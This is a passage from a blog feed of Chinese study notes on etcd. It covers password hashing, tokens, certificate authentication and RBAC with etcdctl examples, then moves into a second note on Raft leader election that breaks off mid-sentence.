    <content type="html"><![CDATA[<h1 id="05-鉴权：如何保护你的数据安全？"><a href="#05-鉴权：如何保护你的数据安全？" class="headerlink" title="05. 鉴权：如何保护你的数据安全？"></a>05. 鉴权：如何保护你的数据安全？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>当使用etcd存储业务敏感数据、多租户共享使用同etcd集群的时候，应该如何防止匿名用户访问你的etcd数据呢？多租户场景又如何最小化用户权限分配，防止越权访问的？</p><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>etcd鉴权体系架构由控制面和数据面组成。</p><p><img src="https://static001.geekbang.org/resource/image/30/4e/304257ac790aeda91616bfe42800364e.png?wh=1920*420" alt="img"></p><p>上图是是etcd鉴权体系控制面，可以通过客户端工具etcdctl和鉴权API动态调整认证、鉴权规则，AuthServer收到请求后，为了确保各节点间鉴权元数据一致性，会通过Raft模块进行数据同步。</p><p>当对应的Raft日志条目被集群半数以上节点确认后，Apply模块通过鉴权存储(AuthStore)模块，执行日志条目的内容，将规则存储到boltdb的一系列“鉴权表”里面。</p><p>下图是数据面鉴权流程，由认证和授权流程组成。认证的目的是检查client的身份是否合法、防止匿名用户访问等。目前etcd实现了两种认证机制，分别是密码认证和证书认证。</p><p><img src="https://static001.geekbang.org/resource/image/2c/55/2c8f90fd1a30fab9b9a88ba18c24c555.png?wh=1920*1136" alt="img"></p><p>认证通过后，为了提高密码认证性能，会分配一个Token（类似我们生活中的门票、通信证）给client，client后续其他请求携带此Token，server就可快速完成client的身份校验工作。</p><p>实现分配Token的服务也有多种，这是TokenProvider所负责的，目前支持SimpleToken和JWT两种。</p><p>通过认证后，在访问MVCC模块之前，还需要通过授权流程。授权的目的是检查client是否有权限操作你请求的数据路径，etcd实现了RBAC机制，支持为每个用户分配一个角色，为每个角色授予最小化的权限。</p><p><img src="https://static001.geekbang.org/resource/image/8d/8a/8d18f8877ea7c8fbyybebae236a8688a.png?wh=1920*1125" alt="img"></p><p>好了，etcd鉴权体系的整个流程讲完了，下面就以 put hello命令为例，给你深入分析以上鉴权体系是如何进行身份认证来防止匿名访问的，又是如何实现细粒度的权限控制以防止越权访问的。</p><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>首先我们来看第一个问题，如何防止匿名用户访问你的etcd数据呢？</p><p>解决方案当然是认证用户身份。那etcd提供了哪些机制来验证client身份呢?</p><p>正如我整体架构中给你介绍的，etcd目前实现了两种机制，分别是用户密码认证和证书认证，下面我分别给你介绍这两种机制在etcd中如何实现，以及这两种机制各自的优缺点。</p><h3 id="密码认证"><a href="#密码认证" class="headerlink" title="密码认证"></a>密码认证</h3><p>首先我们来讲讲用户密码认证。etcd支持为每个用户分配一个账号名称、密码。密码认证在我们生活中无处不在，从银行卡取款到微信、微博app登录，再到核武器发射，密码认证应用及其广泛，是最基础的鉴权的方式。</p><p>但密码认证存在两大难点，它们分别是如何保障密码安全性和提升密码认证性能。</p><h4 id="如何保障密码安全性"><a href="#如何保障密码安全性" class="headerlink" title="如何保障密码安全性"></a>如何保障密码安全性</h4><p>首先来看第一个难点：如何保障密码安全性。</p><p>收到用户鉴权请求的时候，检查用户请求中密码与存储中是否一样，不就可以了吗？ 这种方案的确够简单，但若存储密码的文件万一被黑客脱库了，那么所有用户的密码都将被泄露，进而可能会导致重大数据泄露事故。</p><p>也许可以奇思妙想构建一个加密算法?然后将密码翻译下，比如将密码中的每个字符按照字母表序替换成字母后的第XX个字母。然而这种加密算法，它是可逆的，一旦被黑客识别到规律，还原出你的密码后，脱库后也将导致全部账号数据泄密。</p><p>那么是否用一种不可逆的加密算法就行了呢？比如常见的MD5，SHA-1，这方案听起来似乎有点道理，然而还是不严谨，因为它们的计算速度非常快，黑客可以通过暴力枚举、字典、彩虹表等手段，快速将你的密码全部破解。</p><p>LinkedIn在2012年的时候650万用户密码被泄露，黑客3天就暴力破解出90%用户的密码，原因就是LinkedIn仅仅使用了SHA-1加密算法。</p><p><strong>那应该如何进一步增强不可逆hash算法的破解难度？</strong></p><p>一方面可以使用安全性更高的hash算法，比如SHA-256，它输出位数更多、计算更加复杂且耗CPU。</p><p>另一方面可以在每个用户密码hash值的计算过程中，引入一个随机、较长的加盐(salt)参数，它可以让相同的密码输出不同的结果，这让彩虹表破解直接失效。</p><p>彩虹表是黑客破解密码的一种方法之一，它预加载了常用密码使用MD5&#x2F;SHA-1计算的hash值，可通过hash值匹配快速破解你的密码。</p><p>最后还可以增加密码hash值计算过程中的开销，比如循环迭代更多次，增加破解的时间成本。</p><p><strong>etcd的鉴权模块如何安全存储用户密码？</strong></p><p>etcd的用户密码存储正是融合了以上讨论的高安全性hash函数（Blowfish encryption algorithm）、随机的加盐salt、可自定义的hash值计算迭代次数cost。</p><p>下面通过几个简单etcd鉴权API，介绍密码认证的原理。</p><p>首先你可以通过如下的auth enable命令开启鉴权，注意etcd会先要求你创建一个root账号，它拥有集群的最高读写权限。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ etcdctl <span class="hljs-keyword">user</span> <span class="hljs-title">add</span> root:root<br><span class="hljs-keyword">User</span> <span class="hljs-title">root</span> created<br>$ etcdctl auth enable<br>Authentication Enabled<br><br></code></pre></td></tr></table></figure><p>启用鉴权后，这时client发起如下put hello操作时， etcd server会返回”user name is empty”错误给client，就初步达到了防止匿名用户访问你的etcd数据目的。 那么etcd server是在哪里做的鉴权的呢?</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ etcdctl put hello world<br><span class="hljs-keyword">Error: </span>etcdserver: user name is empty<br><br></code></pre></td></tr></table></figure><p>etcd server收到put hello请求的时候，在提交到Raft模块前，它会从你请求的上下文中获取你的用户身份信息。如果你未通过认证，那么在状态机应用put命令的时候，检查身份权限的时候发现是空，就会返回此错误给client。</p><p>下面我通过鉴权模块的user命令，给etcd增加一个alice账号。我们一起来看看etcd鉴权模块是如何基于我上面介绍的技术方案，来安全存储alice账号信息。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ etcdctl <span class="hljs-keyword">user</span> <span class="hljs-title">add</span> alice:alice --<span class="hljs-keyword">user</span> <span class="hljs-title">root</span>:root<br><span class="hljs-keyword">User</span> <span class="hljs-title">alice</span> created<br><br></code></pre></td></tr></table></figure><p>鉴权模块收到此命令后，它会使用bcrpt库的blowfish算法，基于明文密码、随机分配的salt、自定义的cost、迭代多次计算得到一个hash值，并将加密算法版本、salt值、cost、hash值组成一个字符串，作为加密后的密码。</p><p>最后，鉴权模块将用户名alice作为key，用户名、加密后的密码作为value，存储到boltdb的authUsers bucket里面，完成一个账号创建。</p><p>当你使用alice账号访问etcd的时候，你需要先调用鉴权模块的Authenticate接口，它会验证你的身份合法性。</p><p>那么etcd如何验证你密码正确性的呢？</p><p>鉴权模块首先会根据你请求的用户名alice，从boltdb获取加密后的密码，因此hash值包含了算法版本、salt、cost等信息，因此可以根据你请求中的明文密码，计算出最终的hash值，若计算结果与存储一致，那么身份校验通过。</p><h4 id="如何提升密码认证性能"><a href="#如何提升密码认证性能" class="headerlink" title="如何提升密码认证性能"></a>如何提升密码认证性能</h4><p>通过以上的鉴权安全性的深入分析，我们知道身份验证这个过程开销极其昂贵，那么问题来了，如何避免频繁、昂贵的密码计算匹配，提升密码认证的性能呢？</p><p>这就是密码认证的第二个难点，如何保证性能。</p><p>想想我们办理港澳通行证的时候，流程特别复杂，需要各种身份证明、照片、指纹信息，办理成功后，下发通信证，每次过关你只需要刷下通信证即可，高效而便捷。</p><p>那么，在软件系统领域如果身份验证通过了后，我们是否也可以返回一个类似通信证的凭据给client，后续请求携带通信证，只要通行证合法且在有效期内，就无需再次鉴权了呢？</p><p>是的，etcd也有类似这样的凭据。当etcd server验证用户密码成功后，它就会返回一个Token字符串给client，用于表示用户的身份。后续请求携带此Token，就无需再次进行密码校验，实现了通信证的效果。</p><p>etcd目前支持两种Token，分别为Simple Token和JWT Token。</p><p><strong>Simple Token</strong></p><p>Simple Token实现正如名字所言，简单。</p><p>Simple Token的核心原理是当一个用户身份验证通过后，生成一个随机的字符串值Token返回给client，并在内存中使用map存储用户和Token映射关系。当收到用户的请求时， etcd会从请求中获取Token值，转换成对应的用户名信息，返回给下层模块使用。</p><p>Token是你身份的象征，若此Token泄露了，那你的数据就可能存在泄露的风险。etcd是如何应对这种潜在的安全风险呢？</p><p>etcd生成的每个Token，都有一个过期时间TTL属性，Token过期后client需再次验证身份，因此可显著缩小数据泄露的时间窗口，在性能上、安全性上实现平衡。</p><p>在etcd v3.4.9版本中，Token默认有效期是5分钟，etcd server会定时检查你的Token是否过期，若过期则从map数据结构中删除此Token。</p><p>不过要注意的是，Simple Token字符串本身并未含任何有价值信息，因此client无法及时、准确获取到Token过期时间。所以client不容易提前去规避因Token失效导致的请求报错。</p><p>从以上介绍中，Simple Token有哪些不足之处？为什么etcd社区仅建议在开发、测试环境中使用Simple Token呢？</p><p>首先它是有状态的，etcd server需要使用内存存储Token和用户名的映射关系。</p><p>其次，它的可描述性很弱，client无法通过Token获取到过期时间、用户名、签发者等信息。</p><p>etcd鉴权模块实现的另外一个Token Provider方案JWT，正是为了解决这些不足之处而生。</p><p><strong>JWT Token</strong></p><p>JWT是Json Web Token缩写， 它是一个基于JSON的开放标准（RFC 7519）定义的一种紧凑、独立的格式，可用于在身份提供者和服务提供者间，传递被认证的用户身份信息。它由Header、Payload、Signature三个对象组成， 每个对象都是一个JSON结构体。</p><p>第一个对象是Header，它包含alg和typ两个字段，alg表示签名的算法，etcd支持RSA、ESA、PS系列，typ表示类型就是JWT。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br><span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;RS256&quot;</span>，<br><span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>第二对象是Payload，它表示载荷，包含用户名、过期时间等信息，可以自定义添加字段。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;<br><span class="hljs-string">&quot;username&quot;</span>: username，<br><span class="hljs-string">&quot;revision&quot;</span>: revision，<br><span class="hljs-string">&quot;exp&quot;</span>:      time.<span class="hljs-constructor">Now()</span>.<span class="hljs-constructor">Add(<span class="hljs-params">t</span>.<span class="hljs-params">ttl</span>)</span>.<span class="hljs-constructor">Unix()</span>，<br>&#125;<br><br></code></pre></td></tr></table></figure><p>第三个对象是签名，首先它将header、payload使用base64 url编码，然后将编码后的</p><p>字符串用”.”连接在一起，最后用我们选择的签名算法比如RSA系列的私钥对其计算签名，输出结果即是Signature。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">signature=<span class="hljs-built_in">RSA256</span>(<br><span class="hljs-function"><span class="hljs-title">base64UrlEncode</span><span class="hljs-params">(header)</span></span> + <span class="hljs-string">&quot;.&quot;</span> +<br><span class="hljs-function"><span class="hljs-title">base64UrlEncode</span><span class="hljs-params">(payload)</span></span>，<br>key)<br><br></code></pre></td></tr></table></figure><p>JWT就是由base64UrlEncode(header).base64UrlEncode(payload).signature组成。</p><p>为什么说JWT是独立、紧凑的格式呢？</p><p>从以上原理介绍中我们知道，它是无状态的。JWT Token自带用户名、版本号、过期时间等描述信息，etcd server不需要保存它，client可方便、高效的获取到Token的过期时间、用户名等信息。它解决了Simple Token的若干不足之处，安全性更高，etcd社区建议大家在生产环境若使用了密码认证，应使用JWT Token( –auth-token ‘jwt’)，而不是默认的Simple Token。</p><p>介绍完密码认证实现过程中的两个核心挑战，密码存储安全和性能的解决方案之后，是否对密码认证的安全性、性能还有所担忧呢？</p><p>接下来我给你介绍etcd的另外一种高性能、更安全的鉴权方案，x509证书认证。</p><h3 id="证书认证"><a href="#证书认证" class="headerlink" title="证书认证"></a>证书认证</h3><p>密码认证一般使用在client和server基于HTTP协议通信的内网场景中。当对安全有更高要求的时候，你需要使用HTTPS协议加密通信数据，防止中间人攻击和数据被篡改等安全风险。</p><p>HTTPS是利用非对称加密实现身份认证和密钥协商，因此使用HTTPS协议的时候，你需要使用CA证书给client生成证书才能访问。</p><p>那么一个client证书包含哪些信息呢？使用证书认证的时候，etcd server如何知道你发送的请求对应的用户名称？</p><p>我们可以使用下面的openssl命令查看client证书的内容，下图是一个x509 client证书的内容，它含有证书版本、序列号、签名算法、签发者、有效期、主体名等信息，我们重点要关注的是主体名中的CN字段。</p><p>在etcd中，如果你使用了HTTPS协议并启用了client证书认证(–client-cert-auth)，它会取CN字段作为用户名，在我们的案例中，alice就是client发送请求的用户名。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">openssl x509 -noout -<span class="hljs-built_in">text</span> -<span class="hljs-keyword">in</span> client.pem<br><br></code></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/resource/image/55/94/55e03b4353c9a467493a3922cf68b294.png?wh=1144*854" alt="img"></p><p>证书认证在稳定性、性能上都优于密码认证。</p><p>稳定性上，它不存在Token过期、使用更加方便、会让少踩坑，避免了不少Token失效而触发的Bug。性能上，证书认证无需像密码认证一样调用昂贵的密码认证操作(Authenticate请求)，此接口支持的性能极低。</p><h2 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h2><p>当使用如上创建的alice账号执行put hello操作的时候，etcd却会返回如下的”etcdserver: permission denied”无权限错误，这是为什么呢？</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ etcdctl put hello world --user alice:alice<br><span class="hljs-keyword">Error: </span>etcdserver: permission denied<br><br></code></pre></td></tr></table></figure><p>这是因为开启鉴权后，put请求命令在应用到状态机前，etcd还会对发出此请求的用户进行权限检查， 判断其是否有权限操作请求的数据。常用的权限控制方法有ACL(Access Control List)、ABAC(Attribute-based access control)、RBAC(Role-based access control)，etcd实现的是RBAC机制。</p><h3 id="RBAC"><a href="#RBAC" class="headerlink" title="RBAC"></a>RBAC</h3><p>什么是基于角色权限的控制系统(RBAC)呢？</p><p>它由下图中的三部分组成，User、Role、Permission。User表示用户，如alice。Role表示角色，它是权限的赋予对象。Permission表示具体权限明细，比如赋予Role对key范围在[key，KeyEnd]数据拥有什么权限。目前支持三种权限，分别是READ、WRITE、READWRITE。</p><p><img src="https://static001.geekbang.org/resource/image/ee/60/ee6e0a9a63aeaa2d3505ab1a37360760.png?wh=1786*1134" alt="img"></p><p>下面我们通过etcd的RBAC机制，给alice用户赋予一个可读写[hello,helly]数据范围的读写权限， 如何操作呢?</p><p>按照上面介绍的RBAC原理，首先需要创建一个role，这里我们命名为admin，然后新增了一个可读写[hello,helly]数据范围的权限给admin角色，并将admin的角色的权限授予了用户alice。详细如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ <span class="hljs-comment">#创建一个admin role</span><br>etcdctl <span class="hljs-keyword">role</span> <span class="hljs-title">add</span> admin  --<span class="hljs-keyword">user</span> <span class="hljs-title">root</span>:root<br><span class="hljs-keyword">Role</span> <span class="hljs-title">admin</span> created<br><span class="hljs-comment"># #分配一个可读写[hello，helly]范围数据的权限给admin role</span><br>$ etcdctl <span class="hljs-keyword">role</span> <span class="hljs-title">grant-permission</span> admin readwrite hello helly --<span class="hljs-keyword">user</span> <span class="hljs-title">root</span>:root<br><span class="hljs-keyword">Role</span> <span class="hljs-title">admin</span> updated<br><span class="hljs-comment"># 将用户alice和admin role关联起来，赋予admin权限给user</span><br>$ etcdctl <span class="hljs-keyword">user</span> <span class="hljs-title">grant-role</span> alice admin --<span class="hljs-keyword">user</span> <span class="hljs-title">root</span>:root<br><span class="hljs-keyword">Role</span> <span class="hljs-title">admin</span> is granted to <span class="hljs-keyword">user</span> <span class="hljs-title">alice</span><br><br></code></pre></td></tr></table></figure><p>然后再次使用etcdctl执行put hello命令时，鉴权模块会从boltdb查询alice用户对应的权限列表。</p><p>因为有可能一个用户拥有成百上千个权限列表，etcd为了提升权限检查的性能，引入了区间树，检查用户操作的key是否在已授权的区间，时间复杂度仅为O(logN)。</p><p>在这个案例中，很明显hello在admin角色可读写的[hello，helly)数据范围内，因此它有权限更新key hello，执行成功。也可以尝试更新key hey，因为此key未在鉴权的数据区间内，因此etcd server会返回”etcdserver: permission denied”错误给client，如下所示。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ etcdctl put hello world --user alice:alice<br>OK<br>$ etcdctl put hey hey --user alice:alice<br><span class="hljs-keyword">Error: </span>etcdserver: permission denied<br><br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>设计实现一个鉴权模块最关键的目标和挑战应该是<strong>安全、性能以及一致性</strong>。</p><p>首先鉴权目的是为了保证安全，必须防止恶意用户绕过鉴权系统、伪造、篡改、越权等行为，同时设计上要有前瞻性，做到即使被拖库也影响可控。etcd的解决方案是通过密码安全加密存储、证书认证、RBAC等机制保证其安全性。</p><p>然后，鉴权作为了一个核心的前置模块，性能上不能拖后腿，不能成为影响业务性能的一个核心瓶颈。etcd的解决方案是通过Token降低频繁、昂贵的密码验证开销，可应用在内网、小规模业务场景，同时支持使用证书认证，不存在Token过期，巧妙的取CN字段作为用户名，可满足较大规模的业务场景鉴权诉求。</p><p>接着，鉴权系统面临的业务场景是复杂的，因此权限控制系统应当具备良好的扩展性，业务可根据自己实际场景选择合适的鉴权方法。etcd的Token Provider和RBAC扩展机制，都具备较好的扩展性、灵活性。尤其是RBAC机制，让你可以精细化的控制每个用户权限，实现权限最小化分配。</p><p>最后鉴权系统元数据的存储应当是可靠的，各个节点鉴权数据应确保一致，确保鉴权行为一致性。早期etcd v2版本时，因鉴权命令未经过Raft模块，存在数据不一致的问题，在etcd v3中通过Raft模块同步鉴权指令日志指令，实现鉴权数据一致性。</p><p><strong>权衡</strong></p><p><strong>密码鉴权简单易用，但是潜在隐患多，证书可能略麻烦，特别是多租户场景，每个用户证书都不一样，需要独立生成，总的而言，还是不能为一时方便偷懒选用密码</strong></p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>04.Raft协议：etcd如何实现高可用、数据强一致的？</title>
    <link href="/2022/10/03/04-Raft%E5%8D%8F%E8%AE%AE%EF%BC%9Aetcd%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8%E3%80%81%E6%95%B0%E6%8D%AE%E5%BC%BA%E4%B8%80%E8%87%B4%E7%9A%84%EF%BC%9F/"/>
    <url>/2022/10/03/04-Raft%E5%8D%8F%E8%AE%AE%EF%BC%9Aetcd%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8%E3%80%81%E6%95%B0%E6%8D%AE%E5%BC%BA%E4%B8%80%E8%87%B4%E7%9A%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="04-Raft协议：etcd如何实现高可用、数据强一致的？"><a href="#04-Raft协议：etcd如何实现高可用、数据强一致的？" class="headerlink" title="04.Raft协议：etcd如何实现高可用、数据强一致的？"></a>04.Raft协议：etcd如何实现高可用、数据强一致的？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><h2 id="如何避免单点故障"><a href="#如何避免单点故障" class="headerlink" title="如何避免单点故障"></a>如何避免单点故障</h2><p>早期我们使用的数据存储服务，它们往往是部署在单节点上的。但是单节点存在单点故障，一宕机就整个服务不可用，对业务影响非常大。</p><p>随后，为了解决单点问题，软件系统工程师引入了数据复制技术，实现多副本。通过数据复制方案，一方面我们可以提高服务可用性，避免单点故障。另一方面，多副本可以提升读吞吐量、甚至就近部署在业务所在的地理位置，降低访问延迟。</p><p><strong>多副本复制是如何实现的呢？</strong></p><p>多副本常用的技术方案主要有主从复制和去中心化复制。主从复制，又分为全同步复制、异步复制、半同步复制，比如MySQL&#x2F;Redis单机主备版就基于主从复制实现的。</p><p><strong>全同步复制</strong> 是指主收到一个写请求后，必须等待全部从节点确认返回后，才能返回给客户端成功。因此如果一个从节点故障，整个系统就会不可用。这种方案为了保证多副本的一致性，而牺牲了可用性，一般使用不多。</p><p><strong>异步复制</strong> 是指主收到一个写请求后，可及时返回给client，异步将请求转发给各个副本，若还未将请求转发到副本前就故障了，则可能导致数据丢失，但是可用性是最高的。</p><p><strong>半同步复制</strong> 介于全同步复制、异步复制之间，它是指主收到一个写请求后，至少有一个副本接收数据后，就可以返回给客户端成功，在数据一致性、可用性上实现了平衡和取舍。</p><p>跟主从复制相反的就是 <strong>去中心化复制</strong>，它是指在一个n副本节点集群中，任意节点都可接受写请求，但一个成功的写入需要w个节点确认，读取也必须查询至少r个节点。</p><p>可以根据实际业务场景对数据一致性的敏感度，设置合适w&#x2F;r参数。比如你希望每次写入后，任意client都能读取到新值，如果n是3个副本，你可以将w和r设置为2，这样当你读两个节点时候，必有一个节点含有最近写入的新值，这种读我们称之为法定票数读（quorum read）。</p><p>AWS的Dynamo系统就是基于去中心化的复制算法实现的。它的优点是节点角色都是平等的，降低运维复杂度，可用性更高。但是缺陷是去中心化复制，势必会导致各种写入冲突，业务需要关注冲突处理。</p><p>从以上分析中，为了解决单点故障，从而引入了多副本。但基于复制算法实现的数据库，为了保证服务可用性，大多数提供的是最终一致性，总而言之，不管是主从复制还是异步复制，都存在一定的缺陷。</p><p><strong>如何解决以上复制算法的困境呢？</strong></p><p>答案就是共识算法，它最早是基于复制状态机背景下提出来的。 下图是复制状态机的结构（引用自Raft paper）， 它由共识模块、日志模块、状态机组成。通过共识模块保证各个节点日志的一致性，然后各个节点基于同样的日志、顺序执行指令，最终各个复制状态机的结果实现一致。</p><p><img src="https://static001.geekbang.org/resource/image/3y/eb/3yy3fbc1ab564e3af9ac9223db1435eb.png?wh=605*319" alt="img"></p><p>共识算法的祖师爷是Paxos， 但是由于它过于复杂，难于理解，工程实践上也较难落地，导致在工程界落地较慢。standford大学的Diego提出的Raft算法正是为了可理解性、易实现而诞生的，它通过问题分解，将复杂的共识问题拆分成三个子问题，分别是：</p><ul><li>Leader选举，Leader故障后集群能快速选出新Leader；</li><li>日志复制， 集群只有Leader能写入日志， Leader负责复制日志到Follower节点，并强制Follower节点与自己保持相同；</li><li>安全性，一个任期内集群只能产生一个Leader、已提交的日志条目在发生Leader选举时，一定会存在更高任期的新Leader日志中、各个节点的状态机应用的任意位置的日志条目内容应一样等。</li></ul><p>下面以实际场景为案例，深入讨论这三个子问题，看看Raft是如何解决这三个问题，以及在etcd中的应用实现。</p><h2 id="Leader选举"><a href="#Leader选举" class="headerlink" title="Leader选举"></a>Leader选举</h2><p>当etcd server收到client发起的put hello写请求后，KV模块会向Raft模块提交一个put提案，<strong>只有集群Leader才能处理写提案，</strong>如果此时集群中无Leader， 整个请求就会超时。</p><p>那么Leader是怎么诞生的呢？Leader crash之后其他节点如何竞选呢？</p><p>首先在Raft协议中它定义了集群中的如下节点状态，任何时刻，每个节点肯定处于其中一个状态：</p><ul><li>Follower，跟随者， 同步从Leader收到的日志，etcd启动的时候默认为此状态；</li><li>Candidate，竞选者，可以发起Leader选举；</li><li>Leader，集群领导者， 唯一性，拥有同步日志的特权，需定时广播心跳给Follower节点，以维持领导者身份。</li></ul><p><img src="https://static001.geekbang.org/resource/image/a5/09/a5a210eec289d8e4e363255906391009.png?wh=1808*978" alt="img"></p><p>上图是节点状态变化关系图，当Follower节点接收Leader节点心跳消息超时后，它会转变成Candidate节点，并可发起竞选Leader投票，若获得集群多数节点的支持后，它就可转变成Leader节点。</p><p>下面我以Leader crash场景为案例，给你详细介绍一下etcd Leader选举原理。</p><p>假设集群总共3个节点，A节点为Leader，B、C节点为Follower。</p><p><img src="https://static001.geekbang.org/resource/image/a2/59/a20ba5b17de79d6ce8c78a712a364359.png?wh=1920*942" alt="img"></p><p>如上Leader选举图左边部分所示， 正常情况下，Leader节点会按照心跳间隔时间，定时广播心跳消息（MsgHeartbeat消息）给Follower节点，以维持Leader身份。 Follower收到后回复心跳应答包消息（MsgHeartbeatResp消息）给Leader。</p><p>细心的你可能注意到上图中的Leader节点下方有一个任期号（term）， 它具有什么样的作用呢？</p><p>这是因为Raft将时间划分成一个个任期，任期用连续的整数表示，每个任期从一次选举开始，赢得选举的节点在该任期内充当Leader的职责，随着时间的消逝，集群可能会发生新的选举，任期号也会单调递增。</p><p>通过任期号，可以比较各个节点的数据新旧、识别过期的Leader等，它在Raft算法中充当逻辑时钟，发挥着重要作用。</p><p>了解完正常情况下Leader维持身份的原理后，我们再看异常情况下，也就Leader crash后，etcd是如何自愈的呢？</p><p>如上Leader选举图右边部分所示，当Leader节点异常后，Follower节点会接收Leader的心跳消息超时，当超时时间大于竞选超时时间后，它们会进入Candidate状态。</p><p>这里要提醒下你，etcd默认心跳间隔时间（heartbeat-interval）是100ms， 默认竞选超时时间（election timeout）是1000ms， 你需要根据实际部署环境、业务场景适当调优，否则就很可能会频繁发生Leader选举切换，导致服务稳定性下降，后面我们实践篇会再详细介绍。</p><p>进入Candidate状态的节点，会立即发起选举流程，自增任期号，投票给自己，并向其他节点发送竞选Leader投票消息（MsgVote）。</p><p>C节点收到Follower B节点竞选Leader消息后，这时候可能会出现如下两种情况：</p><ul><li>第一种情况是C节点判断B节点的数据至少和自己一样新、B节点任期号大于C当前任期号、并且C未投票给其他候选者，就可投票给B。这时B节点获得了集群多数节点支持，于是成为了新的Leader。</li><li>第二种情况是，恰好C也心跳超时超过竞选时间了，它也发起了选举，并投票给了自己，那么它将拒绝投票给B，这时谁也无法获取集群多数派支持，只能等待竞选超时，开启新一轮选举。Raft为了优化选票被瓜分导致选举失败的问题，引入了随机数，每个节点等待发起选举的时间点不一致，优雅的解决了潜在的竞选活锁，同时易于理解。</li></ul><p>Leader选出来后，它什么时候又会变成Follower状态呢？ 从上面的状态转换关系图中你可以看到，如果现有Leader发现了新的Leader任期号，那么它就需要转换到Follower节点。A节点crash后，再次启动成为Follower，假设因为网络问题无法连通B、C节点，这时候根据状态图，我们知道它将不停自增任期号，发起选举。等A节点网络异常恢复后，那么现有Leader收到了新的任期号，就会触发新一轮Leader选举，影响服务的可用性。</p><p>然而A节点的数据是远远落后B、C的，是无法获得集群Leader地位的，发起的选举无效且对集群稳定性有伤害。</p><p>那如何避免以上场景中的无效的选举呢？</p><p>在etcd 3.4中，etcd引入了一个PreVote参数（默认false），可以用来启用PreCandidate状态解决此问题，如下图所示。Follower在转换成Candidate状态前，先进入PreCandidate状态，不自增任期号， 发起预投票。若获得集群多数节点认可，确定有概率成为Leader才能进入Candidate状态，发起选举流程。</p><p><img src="https://static001.geekbang.org/resource/image/16/06/169ae84055byya38b616d2e71cfb9706.png?wh=1920*971" alt="img"></p><p>因A节点数据落后较多，预投票请求无法获得多数节点认可，因此它就不会进入Candidate状态，导致集群重新选举。</p><p>这就是Raft Leader选举核心原理，使用心跳机制维持Leader身份、触发Leader选举，etcd基于它实现了高可用，只要集群一半以上节点存活、可相互通信，Leader宕机后，就能快速选举出新的Leader，继续对外提供服务。</p><h2 id="日志复制"><a href="#日志复制" class="headerlink" title="日志复制"></a>日志复制</h2><p>假设在上面的Leader选举流程中，B成为了新的Leader，它收到put提案后，它是如何将日志同步给Follower节点的呢？ 什么时候它可以确定一个日志条目为已提交，通知etcdserver模块应用日志条目指令到状态机呢？</p><p>这就涉及到Raft日志复制原理，下面画了一幅Leader收到put请求后，向Follower节点复制日志的整体流程图，简称流程图，在图中我用序号给你标识了核心流程。</p><p>我将结合流程图、后面的Raft的日志图和你简要分析Leader B收到put hello为world的请求后，是如何将此请求同步给其他Follower节点的。</p><p><img src="https://static001.geekbang.org/resource/image/a5/83/a57a990cff7ca0254368d6351ae5b983.png?wh=1920*1327" alt="img"></p><p>首先Leader收到client的请求后，etcdserver的KV模块会向Raft模块提交一个put hello为world提案消息（流程图中的序号2流程）， 